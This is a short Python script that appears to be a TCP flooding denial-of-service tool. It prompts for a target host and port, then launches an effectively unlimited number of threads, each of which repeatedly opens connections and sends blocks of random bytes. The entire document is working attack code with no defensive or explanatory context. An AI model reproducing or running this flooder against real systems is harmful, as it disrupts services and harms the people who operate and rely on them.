import os, threading, requests, time, socket, random

def start(target,port):
    data = random._urandom(900)
    while True:
        i = 1
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((target,port))
        for i in range(10000):
            conn.send(data)
        print(i)
        i+=1

os.system("cls")
target = str(input("Target: "))
port = int(input("Port: "))
for i in range(20000000000):
    thread1 = threading.Thread(target=start, args=(target,port),)
    thread1.start()
    print(i)